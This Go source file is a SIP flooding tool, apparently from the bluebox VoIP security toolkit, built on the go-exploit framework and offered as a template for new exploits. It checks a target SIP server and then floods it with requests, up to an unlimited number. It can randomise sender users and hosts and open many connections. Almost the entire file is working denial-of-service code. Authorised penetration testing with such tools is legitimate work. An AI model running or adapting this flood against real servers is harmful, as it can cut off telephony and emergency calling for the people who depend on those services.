// Generic exploit for experimenting.
//
// Useful as a template for new ones.
package main

import (
	"math"
	"time"

	sipgo "github.com/emiago/sipgo/sip"
	"github.com/jesusprubio/bluebox/internal"
	"github.com/vulncheck-oss/go-exploit"
	"github.com/vulncheck-oss/go-exploit/config"
	"github.com/vulncheck-oss/go-exploit/output"
	"github.com/vulncheck-oss/go-exploit/protocol/sip"
	"github.com/vulncheck-oss/go-exploit/random"
)

var (
	expectedStatusCode int
	globalUser         string
	globalPassword     string
	globalToUser       string
	globalTransport    string
	transport          sip.TransportType
	globalMethod       string
	method             sipgo.RequestMethod
	globalCount        int
	globalDelay        int
	globalMultiConn    bool
	globalKeepConns    bool
	globalLocalhostSIP string
	globalIncCseq      bool
)

type Sploit struct{}

func (sploit Sploit) ValidateTarget(conf *config.Config) bool {
	resp, ok := internal.Ping(conf, transport, method)
	if resp != nil {
		expectedStatusCode = resp.StatusCode
	}
	return ok
}

func (sploit Sploit) CheckVersion(
	conf *config.Config,
) exploit.VersionCheckType {
	details, ok := internal.Fingerprint(conf, transport, method)
	if !ok || details == nil {
		return exploit.Unknown
	}
	if details.Raw != "" {
		return exploit.Vulnerable
	}
	return exploit.NotVulnerable
}

func (sploit Sploit) RunExploit(conf *config.Config) bool {
	host := conf.Rhost
	reqOpts := &sip.NewSipRequestOpts{
		Port:      conf.Rport,
		LocalHost: conf.Lhost,
		LocalPort: conf.Lport,
		User:      globalUser,
		ToUser:    globalToUser,
		Transport: transport,
	}
	output.PrintFrameworkStatus("Flooding ...")
	if globalCount < 0 {
		output.PrintfError("Invalid count: %d", globalCount)
		return false
	}
	total := uint(globalCount)
	count := uint(0)
	conn, ok := internal.MixedConnect(host, reqOpts.Port, transport)
	if !ok {
		output.PrintfError(
			"Connecting to server %s:%d (%s)", host, reqOpts.Port, transport,
		)
		return false
	}
	var authHeader sipgo.Header
	if globalPassword != "" {
		ok, authHeader = internal.Register(conn, reqOpts)
		if !ok {
			output.PrintfError(
				"Registering user %s with password %s failed", globalUser, globalPassword,
			)
			return false
		}
	}
	if !globalMultiConn {
		defer conn.Close()
		if globalKeepConns {
			output.PrintfWarn("Keeping connection open only applies if using multiple connections")
		}
	}
	for {
		if globalMultiConn {
			conn, ok = internal.MixedConnect(host, reqOpts.Port, transport)
			if !ok {
				output.PrintfError(
					"Connecting to server %s:%d (%s)", host, reqOpts.Port, transport,
				)
				return false
			}
		}
		if globalUser == "" {
			globalUser = random.RandLettersRange(4, 6)
		}
		if globalToUser == "" {
			globalToUser = random.RandLettersRange(4, 6)
		}
		if globalLocalhostSIP == "rand" {
			globalLocalhostSIP = internal.RandomIP(internal.IsIPv6(conn)).String()
		}
		reqOpts.LocalHost = globalLocalhostSIP
		req, ok := sip.NewSipRequest(method, host, reqOpts)
		if !ok {
			output.PrintfError(
				"Creating request to %s with options %+v", host, reqOpts,
			)
			return false
		}
		if globalPassword != "" {
			req.AppendHeader(authHeader)
		}
		if globalIncCseq {
			var seqNo uint32
			if count+1 > uint(math.MaxUint32) {
				seqNo = math.MaxUint32
			} else {
				// TODO: The linter should not complain here.
				seqNo = uint32(count + 1) // #nosec CWE-190
			}
			cseqHeader := sipgo.CSeqHeader{
				SeqNo:      seqNo,
				MethodName: method,
			}
			req.ReplaceHeader(&cseqHeader)
		}
		ok = internal.Send(conn, req, transport)
		if !ok {
			output.PrintfError(
				"Sending request to %s:%d (%s)", host, reqOpts.Port, transport,
			)
			return false
		}
		if !globalKeepConns {
			err := conn.Close()
			if err != nil {
				output.PrintfError("Closing connection: %v", err)
			}
		}
		count++
		if globalCount > 0 && count >= total {
			output.PrintfStatus("Sent %d messages, stopping", count)
			break
		}
		// To avoid flooding the output.
		if count%internal.PrintReqInterval == 0 {
			output.PrintfStatus("Sent %d messages", count)
		}
		if globalDelay > 0 {
			output.PrintfStatus("Sleeping for %d milliseconds", globalDelay)
			time.Sleep(time.Duration(globalDelay) * time.Millisecond)
		}
	}
	return internal.ValidateRunExploit(conf, transport, method, expectedStatusCode)
}

func main() {
	conf := config.NewRemoteExploit(
		config.ImplementedFeatures{
			AssetDetection: true, VersionScanning: true, Exploitation: false,
		},
		// TODO: we need to add it to go-exploit first.
		// config.DenialOfService,
		config.InformationDisclosure,
		nil,
		"",
		nil,
		nil,
		"",
		internal.ProtocolSIP,
		internal.DefaultPort,
	)

	conf.CreateStringVarFlag(
		&globalMethod,
		"method",
		"register",
		"Method to use in the request (options, invite, message, etc.)",
	)
	conf.CreateStringVarFlag(
		&globalUser,
		"user",
		"",
		"Username to use in the From header, random if empty",
	)
	conf.CreateStringVarFlag(
		&globalPassword,
		"pass",
		"",
		"Password to register the user, authentication is disabled if empty",
	)
	conf.CreateStringVarFlag(
		&globalToUser,
		"touser",
		"",
		"Username to use in the To header, random if empty",
	)
	conf.CreateStringVarFlag(
		&globalTransport,
		"transport",
		"tcp",
		"Transport protocol to use (udp, tcp, tls)",
	)
	transport = internal.ParseTransport(globalTransport)
	conf.CreateIntVarFlag(
		&globalCount,
		"count",
		10000,
		"Number of requests to send (0 for infinite)",
	)
	conf.CreateIntVarFlag(
		&globalDelay, "delay", 0, "Number of requests to send (ms)",
	)
	conf.CreateBoolVarFlag(
		&globalMultiConn,
		"connsingle",
		false,
		"Do not reuse the same connection for all requests",
	)
	conf.CreateBoolVarFlag(
		&globalKeepConns,
		"connkeep",
		false,
		"Keep connections open after sending the requests (only applies if using multiple)",
	)
	conf.CreateStringVarFlag(
		&globalLocalhostSIP,
		"fhost",
		"",
		"Host to use in From header of the SIP layer. Use 'rand' to generate one or zero to use the transport layer's local address",
	)
	conf.CreateBoolVarFlag(
		&globalIncCseq,
		"cseq",
		false,
		"Increment the CSeq header in each request",
	)
	method = internal.ParseMethod(globalMethod)
	exploit.RunProgram(Sploit{}, conf)
}
